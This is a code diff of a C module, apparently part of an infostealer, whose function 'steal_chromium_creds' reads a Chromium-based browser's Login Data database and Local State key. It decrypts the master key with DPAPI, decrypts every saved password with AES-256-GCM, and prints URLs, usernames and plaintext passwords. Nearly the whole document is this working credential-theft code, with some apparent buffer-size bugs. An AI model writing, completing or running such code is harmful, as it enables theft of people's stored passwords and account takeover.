@@ -7,18 +7,15 @@
 #include "chromium.h"
 
 #include <dpapi.h>
+#include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <wchar.h>
 #include <windows.h>
 
-#include "base64.h"
+#include "aes.h"
 #include "path.h"
 #include "sqlite3.h"
-
-// TODO Make this a parameter so that we can support multiple chromium browsers
-#define LOGINDATA_PATH L"\\Microsoft\\Edge\\User Data\\Default\\Login Data"
-#define LOCAL_STATE_FILE L"\\Microsoft\\Edge\\User Data\\Local State"
 
 // Retrieves "url login and password" from a chromium based browser sqlite
 // database
@@ -28,7 +25,7 @@
 // locked by the browser
 // NOTE: `loginsOut` must be freed by the caller
 static int retrieve_logins(const PWSTR fullPath, int *loginCountOut,
-                    LoginInfo **loginsOut) {
+                           LoginInfo **loginsOut) {
   sqlite3 *db;
   int rc = sqlite3_open16(fullPath, &db);
   if (rc) {
@@ -78,11 +75,14 @@ static int retrieve_logins(const PWSTR fullPath, int *loginCountOut,
 
     const unsigned char *url = sqlite3_column_text(statement, 0);
     const unsigned char *username = sqlite3_column_text(statement, 1);
-    const unsigned char *password = sqlite3_column_text(statement, 2);
+    const unsigned char *passwordBlock = sqlite3_column_text(statement, 2);
+    const int passwordBlockSize = sqlite3_column_bytes(statement, 2);
 
     (*loginsOut)[*loginCountOut].url = strdup((const char *)url);
     (*loginsOut)[*loginCountOut].username = strdup((const char *)username);
-    (*loginsOut)[*loginCountOut].password = strdup((const char *)password);
+    (*loginsOut)[*loginCountOut].passwordBlock =
+        strdup((const char *)passwordBlock);
+    (*loginsOut)[*loginCountOut].passwordBlockSize = passwordBlockSize;
 
     (*loginCountOut)++;
   }
@@ -98,7 +98,7 @@ void free_logins(LoginInfo *logins, int count) {
   for (int i = 0; i < count; i++) {
     free(logins[i].url);
     free(logins[i].username);
-    free(logins[i].password);
+    free(logins[i].passwordBlock);
   }
   free(logins);
 }
@@ -203,54 +203,117 @@ static int retrieve_encrypted_key(PWSTR localStatePath, PSTR *encryptedKeyOut) {
 
   strncpy(*encryptedKeyOut, start, length);
   (*encryptedKeyOut)[length] = '\0';
-  
+
   free(fileBuffer);
   return EXIT_SUCCESS;
 }
 
 // decrypt an encrypted_key using DPAPI
-// NOTE return value must be freed
-static int decrypt_key(BYTE *encryptedKey, DWORD encryptedKeyLen,
-                PSTR *decryptedKeyOut) {
-  DATA_BLOB encryptedBlob;
-  encryptedBlob.pbData = encryptedKey;
-  encryptedBlob.cbData = encryptedKeyLen;
-
-  DATA_BLOB decryptedBlob;
-  if (!CryptUnprotectData(&encryptedBlob, NULL, NULL, NULL, NULL, 0,
-                          &decryptedBlob)) {
-    printf("Failed to decrypt data. Error code: %lu\n", GetLastError());
+// NOTE: `decryptedKeyOut` must be freed by the caller
+static int decrypt_key(PCSTR encryptedKey, DATA_BLOB *decryptedKeyOut) {
+  DWORD decodedBinarySize = 0;
+  if (!CryptStringToBinaryA(encryptedKey, 0, CRYPT_STRING_BASE64, NULL,
+                            &decodedBinarySize, NULL, NULL)) {
+    fprintf(stderr, "Failed getting base64 size. Error code: %lu\n",
+            GetLastError());
     return EXIT_FAILURE;
   }
 
-  *decryptedKeyOut = (PSTR)malloc(decryptedBlob.cbData + 1);
-  if (!*decryptedKeyOut) {
-    LocalFree(decryptedBlob.pbData);
-    printf("Failed to allocate memory for decrypted key.\n");
+  BYTE *decodedBinaryData = (BYTE *)malloc(decodedBinarySize);
+  if (decodedBinaryData == NULL) {
+    fprintf(stderr, "Failed allocating memory\n");
     return EXIT_FAILURE;
   }
 
-  memcpy(*decryptedKeyOut, decryptedBlob.pbData, decryptedBlob.cbData);
-  (*decryptedKeyOut)[decryptedBlob.cbData] = '\0';
+  if (!CryptStringToBinaryA(encryptedKey, 0, CRYPT_STRING_BASE64,
+                            decodedBinaryData, &decodedBinarySize, NULL,
+                            NULL)) {
+    fprintf(stderr, "Failed decoding base64. Error code: %lu\n",
+            GetLastError());
+    free(decodedBinaryData);
+    return EXIT_FAILURE;
+  }
 
-  LocalFree(decryptedBlob.pbData);
+  // Remove the first five bytes
+  size_t newSize = decodedBinarySize - 5;
+  BYTE *newData = (BYTE *)malloc(newSize);
+  if (newData == NULL) {
+    fprintf(stderr, "Failed allocating memory\n");
+    free(decodedBinaryData);
+    return EXIT_FAILURE;
+  }
+  memcpy(newData, decodedBinaryData + 5, newSize);
+  free(decodedBinaryData);
 
+  DATA_BLOB DataInput;
+  DATA_BLOB DataOutput;
+
+  DataInput.cbData = (DWORD)newSize;
+  DataInput.pbData = newData;
+
+  if (!CryptUnprotectData(&DataInput, NULL, NULL, NULL, NULL, 0, &DataOutput)) {
+    fprintf(stderr, "Failed decrypting key. Error code: %lu\n", GetLastError());
+    free(newData);
+    return EXIT_FAILURE;
+  }
+
+  // Set the output blob
+  decryptedKeyOut->cbData = DataOutput.cbData;
+  decryptedKeyOut->pbData = DataOutput.pbData;
+
+  free(newData);
+  return EXIT_SUCCESS;
+}
+
+static int decrypt_logins(LoginInfo *logins, int loginCount,
+                          Credential **credentialsOut, int *credentialCountOut,
+                          BYTE *key) {
+  *credentialsOut = (Credential *)malloc(loginCount * sizeof(Credential));
+  if (*credentialsOut == NULL) {
+    fprintf(stderr, "Memory allocation failed\n");
+    return EXIT_FAILURE;
+  }
+
+  for (int i = 0; i < loginCount; i++) {
+    BYTE *passwordBlock = (BYTE *)logins[i].passwordBlock;
+    size_t passwordBlockSize = logins[i].passwordBlockSize;
+    BYTE *nonce = passwordBlock + 3;
+    BYTE *ciphertext = passwordBlock + 15;
+    size_t ciphertextSize = passwordBlockSize - (12 + 3);
+
+    BYTE *plaintext = (BYTE *)malloc(ciphertextSize - (12 + 5));
+    if (plaintext == NULL) {
+      fprintf(stderr, "Memory allocation failed\n");
+      free(*credentialsOut);
+      return EXIT_FAILURE;
+    }
+
+    if (AES_GCM_decrypt(key, nonce, ciphertext, ciphertextSize, NULL, 0, 0,
+                        plaintext)) {
+      fprintf(stderr, "Decryption failed\n");
+      free(plaintext);
+      free(*credentialsOut);
+      return EXIT_FAILURE;
+    }
+
+    plaintext[ciphertextSize - (12 + 5 - 1)] = '\0';
+
+    (*credentialsOut)[i].url = strdup(logins[i].url);
+    (*credentialsOut)[i].username = strdup(logins[i].username);
+    (*credentialsOut)[i].password = strdup((const char *)plaintext);
+
+    free(plaintext);
+  }
+
+  *credentialCountOut = loginCount;
   return EXIT_SUCCESS;
 }
 
 int steal_chromium_creds() {
-  PWSTR localAppdataPath;
-  if (get_localappdata_path(&localAppdataPath)) {
-    fprintf(stderr, "Unable to get local appdata PATH");
-    return EXIT_FAILURE;
-  }
-
+  //////////////////////////////////////////////////////////////
   PWSTR loginDataPath;
-  if (concat_paths(localAppdataPath, LOGINDATA_PATH, &loginDataPath)) {
-    CoTaskMemFree(
-        localAppdataPath);  // free memory from the call to SHGetKnownFolderPath
-                            // in `get_localappdata_path`
-    return 1;
+  if (get_logindata_path(&loginDataPath)) {
+    fprintf(stderr, "Unable to get local appdata PATH");
     return EXIT_FAILURE;
   }
 
@@ -258,73 +321,89 @@ int steal_chromium_creds() {
   wprintf(L"Full path: %ls\n", loginDataPath);
   ///
 
+  //////////////////////////////////////////////////////////////
+
   LoginInfo *logins = NULL;
-  int count = 0;
-  if (retrieve_logins(loginDataPath, &count, &logins)) {
+  int loginsCount = 0;
+  if (retrieve_logins(loginDataPath, &loginsCount, &logins)) {
     fprintf(stderr, "Could not retrieve logins from the database");
     return EXIT_FAILURE;
   }
 
   /// DEBUG
-  for (int i = 0; i < count; i++) {
-    printf("===== LOGIN %d =====\n", i);
-    printf("Origin URL: %s\n", logins[i].url);
-    printf("Username: %s\n", logins[i].username);
-    printf("Password: %s\n", logins[i].password);
-  }
-  printf("====================\n");
+   for (int i = 0; i < loginsCount; i++) {
+     printf("===== LOGIN %d =====\n", i);
+     printf("Origin URL: %s\n", logins[i].url);
+     printf("Username: %s\n", logins[i].username);
+     printf("Password: %s\n", logins[i].passwordBlock);
+   }
+   printf("====================\n");
   ///
 
-  PWSTR loginStatePath;
-  if (concat_paths(localAppdataPath, LOCAL_STATE_FILE, &loginStatePath)) {
-    fwprintf(stderr, L"Could not concatenate %ls and %ls", localAppdataPath,
-             LOCAL_STATE_FILE);
+  //////////////////////////////////////////////////////////////
+
+  PWSTR localStatePath;
+  if (get_localstate_path(&localStatePath)) {
+    fprintf(stderr, "Unable to get local appdata PATH");
     return EXIT_FAILURE;
   }
   /// DEBUG
-  wprintf(L"loginStatePath: %ls\n", loginStatePath);
+  wprintf(L"localStatePath: %ls\n", localStatePath);
   ///
 
+  //////////////////////////////////////////////////////////////
+
   PSTR encryptedKey;
-  if (retrieve_encrypted_key(loginStatePath, &encryptedKey)) {
-    wprintf(L"Could not retrieve key from %s\n", loginStatePath);
+  if (retrieve_encrypted_key(localStatePath, &encryptedKey)) {
+    wprintf(L"Could not retrieve key from %s\n", localStatePath);
     return EXIT_FAILURE;
   }
   /// DEBUG
   printf("Encrypted key (base64): %s\n", encryptedKey);
   ///
 
-  int decodedKeySize = b64d_size(strlen(encryptedKey));
-  BYTE *decodedKey = (BYTE *)malloc(decodedKeySize + 1);
-  b64_decode((BYTE *)encryptedKey, strlen(encryptedKey), decodedKey);
-  decodedKey[decodedKeySize] = '\0';
-  /// DEBUG
-  printf("decoded_encrypted_key_len: %d\n", decodedKeySize);
-  ///
+  //////////////////////////////////////////////////////////////
 
-  // Remove the DPAPI at the start as this not part of the key
-  // Allocate memory for the new string
-  BYTE *cleanDecodedKey = (BYTE *)malloc(decodedKeySize - 5);
-
-  // Copy the substring starting from the 6th character
-  memcpy(cleanDecodedKey, (decodedKey + 5), decodedKeySize - 5);
-
-  PSTR decryptedKey;
-  if (decrypt_key((BYTE *)cleanDecodedKey, decodedKeySize - 5, &decryptedKey)) {
-    fprintf(stderr, "Could not decrypt key using DPAPI\n");
+  DATA_BLOB decryptedBlob;
+  if (decrypt_key((PCSTR)encryptedKey, &decryptedBlob)) {
+    fprintf(stderr, "Could not decrypt key\n");
     return EXIT_FAILURE;
   }
+
   /// DEBUG
-  printf("decrypted_key: %s\n", decryptedKey);
+  printf("The key has been decrypted !!\n");
   ///
 
-  free_logins(logins, count);
-  free(decryptedKey);  // allocated in decrypt_key
-  free(encryptedKey);  // allocated in retrieve_encrypted_key
-  free(localAppdataPath); // allocated in
-  free(loginDataPath);
-  CoTaskMemFree(
-      localAppdataPath);  // free memory from the call to SHGetKnownFolderPath
-                          // in `get_localappdata_path`
+  //////////////////////////////////////////////////////////////
+
+  // decrypt passwords using [AES 256
+  // GCM](https://source.chromium.org/chromium/chromium/src/+/main:components/os_crypt/sync/os_crypt_win.cc;l=216-235)
+  // Extract nonce, ciphertext, and signature from logins[0].password
+  // "v10"(3) | nonce (12) | cipher(depends)
+  Credential *credentials = NULL;
+  int credentialCount = 0;
+
+  if (decrypt_logins(logins, loginsCount, &credentials, &credentialCount,
+                     decryptedBlob.pbData) == EXIT_SUCCESS) {
+    for (int i = 0; i < credentialCount; i++) {
+    printf("===== LOGIN %d =====\n", i);
+      printf("URL: %s\n", credentials[i].url);
+      printf("Username: %s\n", credentials[i].username);
+      printf("Password: %s\n", credentials[i].password);
+      free(credentials[i].url);
+      free(credentials[i].username);
+      free(credentials[i].password);
+    }
+  printf("====================\n");
+    free(credentials);
+  } else {
+    printf("Failed to decrypt logins\n");
+  }
+
+  free_logins(logins, loginsCount);
+  LocalFree(decryptedBlob.pbData);      // allocated in decrypt_key
+  free(encryptedKey);    // allocated in retrieve_encrypted_key
+  free(localStatePath);  // allocated in get_localstate_path
+  free(loginDataPath);   // allocated in get_logindata_path
   return EXIT_SUCCESS;
 }
